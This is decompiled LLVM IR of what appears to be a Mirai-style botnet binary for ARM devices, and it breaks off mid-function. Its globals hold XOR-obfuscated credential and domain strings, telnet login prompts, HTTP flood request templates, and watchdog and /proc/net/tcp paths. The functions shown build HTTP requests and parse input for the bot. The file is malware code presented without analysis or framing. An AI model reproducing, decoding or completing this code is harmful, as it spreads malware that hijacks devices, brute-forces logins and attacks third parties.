source_filename = "test"
target datalayout = "e-p:32:32:32-f80:32:32"

@r0 = internal unnamed_addr global i32 0
@r1 = internal unnamed_addr global i32 0
@r2 = internal unnamed_addr global i32 0
@r3 = internal unnamed_addr global i32 0
@r4 = internal unnamed_addr global i32 0
@r5 = internal unnamed_addr global i32 0
@r6 = internal unnamed_addr global i32 0
@r7 = internal unnamed_addr global i32 0
@r8 = internal unnamed_addr global i32 0
@sb = internal unnamed_addr global i32 0
@sl = internal unnamed_addr global i32 0
@fp = internal unnamed_addr global i32 0
@ip = internal unnamed_addr global i32 0
@sp = internal unnamed_addr global i32 0
@lr = internal unnamed_addr global i32 0
@cpsr_z = internal unnamed_addr global i1 false
@0 = external global i32
@global_var_ecb4.14 = constant i32 -382906384
@global_var_1850c.17 = constant [4 x i8] c"GET\00"
@global_var_18510.19 = constant i32 47
@global_var_1314c.22 = constant i32 -382910336
@global_var_18504.24 = constant i32 32
@global_var_184dc.26 = constant [24 x i8] c" HTTP/1.1\0D\0AUser-Agent: \00"
@global_var_184f4.28 = constant [9 x i8] c"\0D\0AHost: \00"
@global_var_18500.30 = constant [3 x i8] c"\0D\0A\00"
@global_var_18514.32 = constant [9 x i8] c"Cookie: \00"
@global_var_18520.34 = constant [3 x i8] c"; \00"
@global_var_1852c.36 = constant i32 59
@global_var_18524.38 = constant [5 x i8] c"\0D\0A\0D\0A\00"
@global_var_18530.40 = constant [5 x i8] c"http\00"
@global_var_18538.42 = constant [5 x i8] c"url=\00"
@global_var_18540.44 = constant [5 x i8] c"POST\00"
@global_var_18548.46 = constant i32 39
@global_var_124a8.47 = constant i32 -439279616
@global_var_1854c.49 = constant i32 61
@global_var_212f0.53 = global i32 0
@global_var_a06c.54 = constant i32 -352321547
@global_var_14bf4.55 = constant i32 -382909968
@global_var_212f4.57 = global i32 0
@global_var_212f8.58 = local_unnamed_addr global i32 0
@global_var_212fc.59 = local_unnamed_addr global i32 0
@global_var_21300.60 = local_unnamed_addr global i32 0
@global_var_21304.61 = local_unnamed_addr global i32 0
@global_var_21308.62 = local_unnamed_addr global i32 0
@global_var_2130c.63 = local_unnamed_addr global i32 0
@global_var_21310.64 = local_unnamed_addr global i32 0
@global_var_d1a4.70 = constant i32 -382906384
@global_var_d5dc.72 = constant i32 -382906384
@global_var_ca18.74 = constant i32 -382906384
@global_var_c36c.76 = constant i32 -382906384
@global_var_bc74.78 = constant i32 -382906384
@global_var_b4c0.80 = constant i32 -382906384
@global_var_aea4.82 = constant i32 -382906384
@global_var_a810.84 = constant i32 -382906384
@global_var_8190.86 = constant i32 -382906384
@global_var_23394.88 = global i32 0
@global_var_2339c.99 = global i32 0
@global_var_18550.101 = constant [14 x i8] c"/proc/net/tcp\00"
@global_var_21314.105 = global i32 0
@global_var_23398.107 = global i32 0
@global_var_12f18.109 = constant i32 -382910336
@global_var_ec30.111 = constant i32 -382910352
@global_var_233a4.118 = local_unnamed_addr global i32 0
@global_var_233a2.119 = local_unnamed_addr global i32 0
@global_var_18560.122 = constant [14 x i8] c"/dev/watchdog\00"
@global_var_185b4.128 = constant [3 x i8] c"/.\00"
@global_var_18590.130 = constant i32 60108
@global_var_11b48.135 = constant i32 -442552176
@global_var_185b0.140 = constant i32 60084
@global_var_18584.143 = constant i32 10
@global_var_18570.146 = constant [19 x i8] c"/dev/misc/watchdog\00"
@global_var_2131c.157 = global i32 0
@global_var_21328.159 = global i32 0
@global_var_21320.161 = global i32 0
@global_var_21324.163 = global i32 0
@global_var_185c8.169 = constant [33 x i8] c"abcdefghijklmnopqrstuvw012345678\00"
@global_var_fe24.179 = constant i32 -509607925
@global_var_233b8.181 = global i32 0
@global_var_21360.183 = global i32 0
@global_var_2132c.185 = global i32 0
@global_var_21358.187 = global i32 0
@global_var_233b0.194 = global i32 0
@global_var_233b4.196 = global i32 0
@global_var_21332.199 = local_unnamed_addr global i32 0
@global_var_21338.203 = local_unnamed_addr global i32 0
@global_var_21334.204 = local_unnamed_addr global i32 0
@global_var_21339.205 = local_unnamed_addr global i32 0
@global_var_21352.208 = local_unnamed_addr global i32 0
@global_var_185f4.210 = constant i32 387006810
@global_var_185ec.212 = constant [5 x i8] c"PMMV\00"
@global_var_185fc.214 = constant [6 x i8] c"TKXZT\00"
@global_var_18604.216 = constant [6 x i8] c"CFOKL\00"
@global_var_1860c.218 = constant i32 437918234
@global_var_18614.220 = constant [8 x i8] c"ZOJFKRA\00"
@global_var_1861c.222 = constant [8 x i8] c"FGDCWNV\00"
@global_var_18624.224 = constant [9 x i8] c"HWCLVGAJ\00"
@global_var_18630.226 = constant i32 370216979
@global_var_18638.228 = constant i32 269555223
@global_var_18640.230 = constant [8 x i8] c"QWRRMPV\00"
@global_var_18528.232 = constant i32 0
@global_var_18648.234 = constant [9 x i8] c"RCQQUMPF\00"
@global_var_18654.236 = constant i32 370216979
@global_var_1865c.238 = constant [5 x i8] c"WQGP\00"
@global_var_18664.240 = constant [5 x i8] c"RCQQ\00"
@global_var_1866c.242 = constant i32 1263486531
@global_var_18678.244 = constant i32 320017171
@global_var_18680.246 = constant [9 x i8] c"QOACFOKL\00"
@global_var_1868c.248 = constant i32 336860180
@global_var_18694.250 = constant i32 370216979
@global_var_1869c.252 = constant i32 324292169
@global_var_186a4.254 = constant [14 x i8] c"cFOKLKQVPCVMP\00"
@global_var_186b4.256 = constant [7 x i8] c"OGKLQO\00"
@global_var_186bc.258 = constant [8 x i8] c"QGPTKAG\00"
@global_var_186c4.260 = constant [11 x i8] c"QWRGPTKQMP\00"
@global_var_186d0.262 = constant [6 x i8] c"EWGQV\00"
@global_var_186d8.264 = constant i32 1263486531
@global_var_186e0.266 = constant [14 x i8] c"CFOKLKQVPCVMP\00"
@global_var_186f0.268 = constant [5 x i8] c"W@LV\00"
@global_var_186f8.270 = constant i32 324292169
@global_var_18700.272 = constant i32 390551160
@global_var_18708.274 = constant i32 387009354
@global_var_18710.276 = constant [6 x i8] c"HT@XF\00"
@global_var_18718.278 = constant [5 x i8] c"CLIM\00"
@global_var_18720.280 = constant [6 x i8] c"XNZZ\0C\00"
@global_var_18728.282 = constant i32 1867011861
@global_var_18738.284 = constant i32 1867011861
@global_var_18748.286 = constant [7 x i8] c"Q[QVGO\00"
@global_var_18750.288 = constant [5 x i8] c"KIU@\00"
@global_var_18758.290 = constant [9 x i8] c"FPGCO@MZ\00"
@global_var_18764.292 = constant [8 x i8] c"PGCNVGI\00"
@global_var_1876c.294 = constant i32 303174162
@global_var_18778.296 = constant i32 320017171
@global_var_18780.298 = constant i32 319820054
@global_var_18628.300 = constant [5 x i8] c"VGAJ\00"
@global_var_18788.302 = constant [7 x i8] c"OMVJGP\00"
@global_var_18790.304 = constant [7 x i8] c"DWAIGP\00"
@global_var_2133c.305 = local_unnamed_addr global i32 0
@global_var_2133a.306 = local_unnamed_addr global i32 0
@global_var_21340.307 = local_unnamed_addr global i32 0
@global_var_21348.309 = local_unnamed_addr global i32 0
@global_var_21354.310 = local_unnamed_addr global i32 0
@global_var_ff34.312 = constant i32 -382910352
@global_var_187a0.315 = constant [5 x i8] c"ogin\00"
@global_var_187a8.317 = constant [8 x i8] c"assword\00"
@global_var_187b9.319 = constant i32 1327496191
@global_var_187b0.321 = constant i32 2095871
@global_var_18798.326 = constant [6 x i8] c"enter\00"
@global_var_233c0.328 = global i32 0
@global_var_187bc.335 = constant [18 x i8] c"OKP\0CCLMLRNWQ\0CMPE\22\00"
@global_var_233d8.336 = local_unnamed_addr global i32 0
@global_var_233dc.337 = local_unnamed_addr global i32 0
@global_var_187d0.339 = constant [3 x i8] c"\225\00"
@global_var_233e0.340 = local_unnamed_addr global i32 0
@global_var_233e4.341 = local_unnamed_addr global i32 0
@global_var_187d4.343 = constant [18 x i8] c"PGR\0CCLMLRNWQ\0CMPE\22\00"
@global_var_23450.344 = local_unnamed_addr global i32 0
@global_var_23454.345 = local_unnamed_addr global i32 0
@global_var_187e8.347 = constant i32 51097
@global_var_23458.348 = local_unnamed_addr global i32 0
@global_var_2345c.349 = local_unnamed_addr global i32 0
@global_var_187ec.351 = constant i32 1448168270
@global_var_233d0.352 = local_unnamed_addr global i32 0
@global_var_233d4.353 = local_unnamed_addr global i32 0
@global_var_187fc.355 = constant i32 1381389898
@global_var_233ec.356 = local_unnamed_addr global i32 0
@global_var_233e8.357 = local_unnamed_addr global i32 0
@global_var_1881c.359 = constant [8 x i8] c"\0DRPMA\0D\22\00"
@global_var_233f0.360 = local_unnamed_addr global i32 0
@global_var_233f4.361 = local_unnamed_addr global i32 0
@global_var_18824.363 = constant [6 x i8] c"\0DGZG\22\00"
@global_var_233f8.364 = local_unnamed_addr global i32 0
@global_var_233fc.365 = local_unnamed_addr global i32 0
@global_var_1882c.367 = constant i32 1195772418
@global_var_23404.368 = local_unnamed_addr global i32 0
@global_var_23400.369 = local_unnamed_addr global i32 0
@global_var_18838.371 = constant [5 x i8] c"\0DDF\22\00"
@global_var_23408.372 = local_unnamed_addr global i32 0
@global_var_2340c.373 = local_unnamed_addr global i32 0
@global_var_18840.375 = constant [8 x i8] c"\0CCLKOG\22\00"
@global_var_23410.376 = local_unnamed_addr global i32 0
@global_var_23414.377 = local_unnamed_addr global i32 0
@global_var_18848.379 = constant [9 x i8] c"\0DQVCVWQ\22\00"
@global_var_23418.380 = local_unnamed_addr global i32 0
@global_var_2341c.381 = local_unnamed_addr global i32 0
@global_var_18854.383 = constant i32 1836214128
@global_var_23424.384 = local_unnamed_addr global i32 0
@global_var_23420.385 = local_unnamed_addr global i32 0
@global_var_18864.387 = constant [11 x i8] c"jvvrdnmmf\22\00"
@global_var_23428.388 = local_unnamed_addr global i32 0
@global_var_2342c.389 = local_unnamed_addr global i32 0
@global_var_18870.391 = constant [11 x i8] c"nmnlmevdm\22\00"
@global_var_23430.392 = local_unnamed_addr global i32 0
@global_var_23434.393 = local_unnamed_addr global i32 0
@global_var_1887c.395 = constant i32 437738110
@global_var_23438.396 = local_unnamed_addr global i32 0
@global_var_2343c.397 = local_unnamed_addr global i32 0
@global_var_188a0.399 = constant [9 x i8] c"XMNNCPF\22\00"
@global_var_23440.400 = local_unnamed_addr global i32 0
@global_var_23444.401 = local_unnamed_addr global i32 0
@global_var_188ac.403 = constant [12 x i8] c"egvnmacnkr\22\00"
@global_var_2344c.404 = local_unnamed_addr global i32 0
@global_var_23448.405 = local_unnamed_addr global i32 0
@global_var_188b8.407 = constant [7 x i8] c"QJGNN\22\00"
@global_var_23460.408 = local_unnamed_addr global i32 0
@global_var_23464.409 = local_unnamed_addr global i32 0
@global_var_188c0.411 = constant [8 x i8] c"GLC@NG\22\00"
@global_var_23468.412 = local_unnamed_addr global i32 0
@global_var_2346c.413 = local_unnamed_addr global i32 0
@global_var_188c8.415 = constant [8 x i8] c"Q[QVGO\22\00"
@global_var_23470.416 = local_unnamed_addr global i32 0
@global_var_23474.417 = local_unnamed_addr global i32 0
@global_var_188d0.419 = constant [4 x i8] c"QJ\22\00"
@global_var_2347c.420 = local_unnamed_addr global i32 0
@global_var_23478.421 = local_unnamed_addr global i32 0
@global_var_188d4.423 = constant i32 1280000013
@global_var_23480.424 = local_unnamed_addr global i32 0
@global_var_23484.425 = local_unnamed_addr global i32 0
@global_var_188e8.427 = constant i32 1668311919
@global_var_2348c.428 = local_unnamed_addr global i32 0
@global_var_23488.429 = local_unnamed_addr global i32 0
@global_var_18904.431 = constant [10 x i8] c"LAMPPGAV\22\00"
@global_var_23490.432 = local_unnamed_addr global i32 0
@global_var_23494.433 = local_unnamed_addr global i32 0
@global_var_18910.435 = constant i32 1280000013
@global_var_23498.436 = local_unnamed_addr global i32 0
@global_var_2349c.437 = local_unnamed_addr global i32 0
@global_var_18924.439 = constant i32 1280000013
@global_var_234a0.440 = local_unnamed_addr global i32 0
@global_var_234a4.441 = local_unnamed_addr global i32 0
@global_var_1893c.443 = constant i32 1464693110
@global_var_234ac.444 = local_unnamed_addr global i32 0
@global_var_234a8.445 = local_unnamed_addr global i32 0
@global_var_18954.447 = constant [18 x i8] c"\0DGVA\0DPGQMNT\0CAMLD\22\00"
@global_var_234b0.448 = local_unnamed_addr global i32 0
@global_var_234b4.449 = local_unnamed_addr global i32 0
@global_var_18968.451 = constant i32 1196376908
@global_var_234b8.452 = local_unnamed_addr global i32 0
@global_var_234bc.453 = local_unnamed_addr global i32 0
@global_var_18978.455 = constant i32 1280068961
@global_var_234c0.456 = local_unnamed_addr global i32 0
@global_var_18990.458 = constant i32 1195458915
@global_var_234c8.459 = local_unnamed_addr global i32 0
@global_var_189e4.461 = constant i32 1195458915
@global_var_234d0.462 = local_unnamed_addr global i32 0
@global_var_18a08.464 = constant i32 1447841121
@global_var_234d8.465 = local_unnamed_addr global i32 0
@global_var_18a3c.467 = constant i32 1633044305
@global_var_234e0.468 = local_unnamed_addr global i32 0
@global_var_18a4c.470 = constant i32 1346651984
@global_var_234e8.471 = local_unnamed_addr global i32 0
@global_var_18a58.473 = constant i32 1128353102
@global_var_234f0.474 = local_unnamed_addr global i32 0
@global_var_18a64.476 = constant i32 257312593
@global_var_234f8.477 = local_unnamed_addr global i32 0
@global_var_18a74.479 = constant i32 1447841089
@global_var_23500.480 = local_unnamed_addr global i32 0
@global_var_18a88.482 = constant i32 1279479894
@global_var_23508.483 = local_unnamed_addr global i32 0
@global_var_18a9c.485 = constant [9 x i8] c"AJWLIGF\22\00"
@global_var_23510.486 = local_unnamed_addr global i32 0
@global_var_18984.488 = constant i32 1380403017
@global_var_23518.489 = local_unnamed_addr global i32 0
@global_var_18aa8.491 = constant i32 1280068929
@global_var_23520.492 = local_unnamed_addr global i32 0
@global_var_18ab8.494 = constant i32 1414547281
@global_var_23528.495 = local_unnamed_addr global i32 0
@global_var_18acc.497 = constant i32 1414547281
@global_var_23530.498 = local_unnamed_addr global i32 0
@global_var_18ae8.500 = constant i32 1264078191
@global_var_23538.501 = local_unnamed_addr global i32 0
@global_var_18b58.503 = constant i32 1264078191
@global_var_23540.504 = local_unnamed_addr global i32 0
@global_var_18bc8.506 = constant i32 1264078191
@global_var_23548.507 = local_unnamed_addr global i32 0
@global_var_18c38.509 = constant i32 1264078191
@global_var_23550.510 = local_unnamed_addr global i32 0
@global_var_18ca8.512 = constant i32 1264078191
@global_var_23558.513 = local_unnamed_addr global i32 0
@global_var_13210.519 = constant i32 -443088884
@global_var_db2c.535 = constant i32 -494665687
@global_var_21380.537 = global i32 0
@global_var_1364c.539 = constant i32 -456978431
@global_var_23560.552 = global i32 0
@global_var_d514.554 = constant i32 -443744212
@global_var_13be4.559 = constant i32 -478871519
@global_var_14664.573 = constant i32 -478805983
@global_var_14a40.582 = constant i32 -382906384
@global_var_21364.590 = local_unnamed_addr global i32 0
@global_var_164c8.592 = constant i32 -509591552
@global_var_21368.601 = local_unnamed_addr global i32 0
@global_var_16efc.604 = constant i32 -382909968
@global_var_152a0.605 = constant i32 -494075872
@global_var_13114.606 = constant i32 -382910336
@global_var_18d38.610 = constant [11 x i8] c"/proc/stat\00"
@global_var_18d44.615 = constant [14 x i8] c"/proc/cpuinfo\00"
@global_var_18d54.617 = constant [10 x i8] c"processor\00"
@global_var_18d78.619 = constant i32 604672
@global_var_15460.622 = constant i32 -369098421
@global_var_21378.635 = local_unnamed_addr global i32 0
@global_var_2137c.637 = local_unnamed_addr global i32 0
@global_var_18d7c.640 = constant [10 x i8] c"/dev/null\00"
@global_var_14e70.641 = constant i32 -442543860
@global_var_16e60.646 = constant i32 -382910352
@global_var_13680.651 = constant i32 -369094626
@global_var_15e2c.664 = constant i32 -335545128
@global_var_162f4.670 = constant i32 -382909456
@global_var_23390.673 = local_unnamed_addr global i32 0
@global_var_1879c.681 = constant i32 114
@global_var_17320.686 = constant i32 -382906384
@global_var_16e00.704 = constant i32 -509607926
@global_var_19088.709 = constant i32 0
@global_var_182b8.710 = constant i32 -382909968
@global_var_17144.720 = constant i32 -509607928
@global_var_212d0.2 = external global i8*
@global_var_212ec.51 = external global i8*
@global_var_212ed.68 = global i8 0
@1 = internal constant [4 x i8] c"0\11\02\00"
@global_var_233a0.117 = global i16* null
@global_var_2135c.189 = global i16* null
@global_var_21330.198 = external global i8*
@global_var_21344.201 = global i16 0
@global_var_21350.202 = local_unnamed_addr global i8 0
@global_var_21346.206 = local_unnamed_addr global i16 0
@global_var_21351.207 = local_unnamed_addr global i8 0

declare void @__pseudo_branch(i32) local_unnamed_addr

declare void @__pseudo_cond_branch(i1, i32) local_unnamed_addr

define i32 @function_8094() local_unnamed_addr {
entry:
  %v3_8098 = load i32, i32* @r4, align 4
  call void @__pseudo_branch(i32 %v3_8098)
  %v31_80a0 = load i32, i32* @r0, align 4
  ret i32 %v31_80a0
}

define i32 @function_80b0(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r2, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_80b0 = load i32, i32* @r4, align 4
  store i32 %v3_80b0, i32* %stack_var_-8, align 4
  store i32 ptrtoint (i8** @global_var_212d0.2 to i32), i32* %r4.global-to-local, align 4
  %v2_80b8 = load i8, i8* bitcast (i8** @global_var_212d0.2 to i8*), align 4
  %v2_80bc = icmp eq i8 %v2_80b8, 0
  br i1 %v2_80bc, label %dec_label_pc_80c4, label %dec_label_pc_80e0

dec_label_pc_80c4:                                ; preds = %entry
  store i1 true, i1* @cpsr_z, align 1
  %v3_80d4 = call i32 @function_80ec()
  store i32 %v3_80d4, i32* @r0, align 4
  %v2_80dc = load i32, i32* %r4.global-to-local, align 4
  %v3_80dc = inttoptr i32 %v2_80dc to i8*
  store i8 1, i8* %v3_80dc, align 1
  %v2_80e0.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_80e0

dec_label_pc_80e0:                                ; preds = %entry, %dec_label_pc_80c4
  %v2_80e0 = phi i32 [ %v3_80b0, %entry ], [ %v2_80e0.pre, %dec_label_pc_80c4 ]
  store i32 %v2_80e0, i32* %r4.global-to-local, align 4
  %v1_80e4 = load i32, i32* @r0, align 4
  ret i32 %v1_80e4

; uselistorder directives
  uselistorder i8** @global_var_212d0.2, { 1, 0 }
  uselistorder label %dec_label_pc_80e0, { 1, 0 }
}

define i32 @function_80ec() local_unnamed_addr {
dec_label_pc_80ec:
  %v0_80f0 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_80f0, label %bb, label %bb3

bb:                                               ; preds = %dec_label_pc_80ec
  br label %bb3

bb3:                                              ; preds = %bb, %dec_label_pc_80ec
  call void @__pseudo_cond_branch(i1 false, i32 0)
  %v2_8118 = load i32, i32* inttoptr (i32 135340 to i32*), align 4
  %v2_811c = icmp eq i32 %v2_8118, 0
  br i1 %v2_811c, label %dec_label_pc_8134, label %dec_label_pc_8124

dec_label_pc_8124:                                ; preds = %bb3
  call void @__pseudo_cond_branch(i1 false, i32 0)
  br label %dec_label_pc_8134

dec_label_pc_8134:                                ; preds = %bb3, %dec_label_pc_8124
  ret i32 135340

; uselistorder directives
  uselistorder label %dec_label_pc_8134, { 1, 0 }
}

define i32 @entry_point(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_4 = alloca i32, align 4
  %v4_815c = ptrtoint i32* %stack_var_4 to i32
  %v8_817c = call i32 @function_15b9c(i32 ptrtoint (i32* @global_var_ecb4.14 to i32), i32 %arg2, i32* nonnull %stack_var_4, i32 32916, i32 99516, i32 %arg1, i32 %v4_815c)
  %v0_8180 = call i32 @function_14e70()
  ret i32 %v0_8180
}

define i32 @function_8190(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8190:
  %cpsr_c.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-332 = alloca i32, align 4
  %stack_var_-204 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-10572 = alloca i32, align 4
  %stack_var_-408 = alloca i32, align 4
  %stack_var_-20813 = alloca i32, align 4
  %v3_8190 = load i32, i32* @r4, align 4
  %v6_8190 = load i32, i32* @r5, align 4
  %v18_8190 = load i32, i32* @sb, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 21, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r0.global-to-local, align 4
  store i32 %arg4, i32* %r1.global-to-local, align 4
  %v5_81bc = inttoptr i32 %arg4 to i32*
  %v6_81bc = call i32 @function_9f20(i32 %arg3, i32* %v5_81bc, i32 21, i32 0, i32 %arg2)
  %v0_81c0 = load i32, i32* @r5, align 4
  store i32 %v0_81c0, i32* %r1.global-to-local, align 4
  store i32 20, i32* %r2.global-to-local, align 4
  %v0_81cc = load i32, i32* @r4, align 4
  store i32 %v0_81cc, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_1850c.17 to i32), i32* %r3.global-to-local, align 4
  %v6_81d4 = inttoptr i32 %v0_81c0 to i32*
  %v7_81d4 = call i32 @function_9f20(i32 %v0_81cc, i32* %v6_81d4, i32 20, i32 ptrtoint ([4 x i8]* @global_var_1850c.17 to i32), i32 %v6_81bc)
  %v0_81d8 = load i32, i32* @r5, align 4
  store i32 %v0_81d8, i32* %r1.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v7_81d4, i32* @sb, align 4
  %v0_81e8 = load i32, i32* @r4, align 4
  store i32 %v0_81e8, i32* %r0.global-to-local, align 4
  %v5_81ec = inttoptr i32 %v0_81d8 to i32*
  %v6_81ec = call i32 @function_9f20(i32 %v0_81e8, i32* %v5_81ec, i32 8, i32 0, i32 ptrtoint (i32* @0 to i32))
  %v0_81f0 = load i32, i32* @r5, align 4
  store i32 %v0_81f0, i32* %r1.global-to-local, align 4
  store i32 %v6_81ec, i32* @sl, align 4
  store i32 22, i32* %r2.global-to-local, align 4
  %v0_81fc = load i32, i32* @r4, align 4
  store i32 %v0_81fc, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_18510.19 to i32), i32* %r3.global-to-local, align 4
  %v5_8204 = inttoptr i32 %v0_81f0 to i32*
  %v6_8204 = call i32 @function_9f20(i32 %v0_81fc, i32* %v5_8204, i32 22, i32 ptrtoint (i32* @global_var_18510.19 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_8208 = load i32, i32* @r5, align 4
  store i32 %v0_8208, i32* %r1.global-to-local, align 4
  store i32 %v6_8204, i32* @r8, align 4
  store i32 24, i32* %r2.global-to-local, align 4
  %v0_8214 = load i32, i32* @r4, align 4
  store i32 %v0_8214, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v4_821c = inttoptr i32 %v0_8208 to i32*
  %v5_821c = call i32 @function_a45c(i32 %v0_8214, i32* %v4_821c, i32 24, i32 1)
  %v0_8220 = load i32, i32* @r5, align 4
  store i32 %v0_8220, i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 80, i32* %r3.global-to-local, align 4
  store i32 %v5_821c, i32* @r6, align 4
  %v0_8230 = load i32, i32* @r4, align 4
  store i32 %v0_8230, i32* %r0.global-to-local, align 4
  %v4_8234 = inttoptr i32 %v0_8220 to i32*
  %v5_8234 = call i32 @function_a45c(i32 %v0_8230, i32* %v4_8234, i32 7, i32 80)
  %v2_823c = ptrtoint i32* %stack_var_-20813 to i32
  %v3_8244 = mul i32 %v5_8234, 65536
  store i32 %v3_8244, i32* %r3.global-to-local, align 4
  %tmp168 = bitcast i32* %stack_var_-20813 to i8*
  store i32 %v2_823c, i32* %r0.global-to-local, align 4
  store i32 10241, i32* @r2, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  %v3_8258 = urem i32 %v5_8234, 65536
  store i32 %v3_8258, i32* @r7, align 4
  %v3_825c = call i32 @function_135d0(i8* %tmp168, i32 0)
  store i32 %v3_825c, i32* %r0.global-to-local, align 4
  %v0_8260 = load i32, i32* @r8, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_8260 = icmp eq i32 %v0_8260, 0
  store i1 %v2_8260, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_8260, label %.thread14, label %bb

bb:                                               ; preds = %dec_label_pc_8190
  %v1_8264 = load i32, i32* @sl, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v3_8264 = icmp eq i32 %v1_8264, 0
  store i1 %v3_8264, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_8264, label %bb169, label %dec_label_pc_8284

.thread14:                                        ; preds = %dec_label_pc_8190
  store i32 1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_8274

bb169:                                            ; preds = %bb
  store i32 1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_8274

dec_label_pc_8274:                                ; preds = %bb169, %dec_label_pc_82a4, %.thread14, %dec_label_pc_8294, %dec_label_pc_8284
  %v1_8280 = phi i32 [ %v2_82a8, %dec_label_pc_82a4 ], [ %v3_825c, %.thread14 ], [ %v3_825c, %bb169 ], [ %v2_8298, %dec_label_pc_8294 ], [ %v2_8288, %dec_label_pc_8284 ]
  store i32 %v3_8190, i32* %r4.global-to-local, align 4
  store i32 %v6_8190, i32* %r5.global-to-local, align 4
  store i32 %v18_8190, i32* %sb.global-to-local, align 4
  ret i32 %v1_8280

dec_label_pc_8284:                                ; preds = %bb
  store i32 0, i32* @r4, align 4
  store i32 %v0_8260, i32* %r0.global-to-local, align 4
  %v1_8288 = inttoptr i32 %v0_8260 to i8*
  %v2_8288 = call i32 @function_12480(i8* %v1_8288)
  store i32 %v2_8288, i32* %r0.global-to-local, align 4
  %v2_828c = icmp ugt i32 %v2_8288, 254
  store i1 %v2_828c, i1* %cpsr_c.global-to-local, align 1
  %v7_828c = icmp eq i32 %v2_8288, 255
  store i1 %v7_828c, i1* %cpsr_z.global-to-local, align 1
  %v8_8290 = icmp sgt i32 %v2_8288, 255
  br i1 %v8_8290, label %dec_label_pc_8274, label %dec_label_pc_8294

dec_label_pc_8294:                                ; preds = %dec_label_pc_8284
  %v0_8294 = load i32, i32* @sl, align 4
  store i32 %v0_8294, i32* %r0.global-to-local, align 4
  %v1_8298 = inttoptr i32 %v0_8294 to i8*
  %v2_8298 = call i32 @function_12480(i8* %v1_8298)
  store i32 %v2_8298, i32* %r0.global-to-local, align 4
  %v2_829c = icmp ugt i32 %v2_8298, 126
  store i1 %v2_829c, i1* %cpsr_c.global-to-local, align 1
  %v7_829c = icmp eq i32 %v2_8298, 127
  store i1 %v7_829c, i1* %cpsr_z.global-to-local, align 1
  %v8_82a0 = icmp sgt i32 %v2_8298, 127
  br i1 %v8_82a0, label %dec_label_pc_8274, label %dec_label_pc_82a4

dec_label_pc_82a4:                                ; preds = %dec_label_pc_8294
  %v0_82a4 = load i32, i32* @sb, align 4
  store i32 %v0_82a4, i32* %r0.global-to-local, align 4
  %v1_82a8 = inttoptr i32 %v0_82a4 to i8*
  %v2_82a8 = call i32 @function_12480(i8* %v1_82a8)
  store i32 %v2_82a8, i32* %r0.global-to-local, align 4
  %v2_82ac = icmp ugt i32 %v2_82a8, 8
  store i1 %v2_82ac, i1* %cpsr_c.global-to-local, align 1
  %v7_82ac = icmp eq i32 %v2_82a8, 9
  store i1 %v7_82ac, i1* %cpsr_z.global-to-local, align 1
  %v7_82b0 = icmp sgt i32 %v2_82a8, 9
  br i1 %v7_82b0, label %dec_label_pc_8274, label %bb170

bb170:                                            ; preds = %dec_label_pc_82a4
  %v10_82b0 = ptrtoint i32* %stack_var_-408 to i32
  store i32 %v10_82b0, i32* %r2.global-to-local, align 4
  %v8_82b4 = load i32, i32* @r4, align 4
  %v10_82b4 = add i32 %v10_82b0, 364
  %v11_82b4 = inttoptr i32 %v10_82b4 to i32*
  store i32 %v8_82b4, i32* %v11_82b4, align 4
  br label %dec_label_pc_82bc

dec_label_pc_82bc:                                ; preds = %bb170, %bb174
  %v0_82bc = load i32, i32* @sb, align 4
  store i32 %v0_82bc, i32* %r0.global-to-local, align 4
  %v1_82c0 = inttoptr i32 %v0_82bc to i8*
  %v2_82c0 = call i32 @function_12480(i8* %v1_82c0)
  store i32 %v2_82c0, i32* %r0.global-to-local, align 4
  store i32 %v10_82b0, i32* %r1.global-to-local, align 4
  %v3_82c8 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_82c8, i32* %ip.global-to-local, align 4
  %v3_82cc = icmp uge i32 %v2_82c0, %v3_82c8
  store i1 %v3_82cc, i1* %cpsr_c.global-to-local, align 1
  %v9_82cc = icmp eq i32 %v2_82c0, %v3_82c8
  store i1 %v9_82cc, i1* %cpsr_z.global-to-local, align 1
